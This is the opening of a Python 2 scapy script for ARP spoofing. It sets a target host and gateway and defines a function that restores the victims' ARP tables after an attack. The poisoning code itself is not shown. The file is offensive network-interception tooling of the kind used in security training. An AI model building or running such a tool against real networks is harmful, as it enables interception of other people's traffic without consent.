from scapy.all import *
from scapy.error import Scapy_Exception
import os
import sys
import threading
import signal

INTERFACE       =   'wlp1s0'
TARGET_IP       =   '192.168.1.107'
GATEWAY_IP      =   '192.168.1.1'
PACKET_COUNT    =   1000

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print '[*] Restoring targets...'
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff', \
        hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", \
        hwsrc=target_mac), count=5)
    os.kill(os.getpid(), signal.SIGINT)
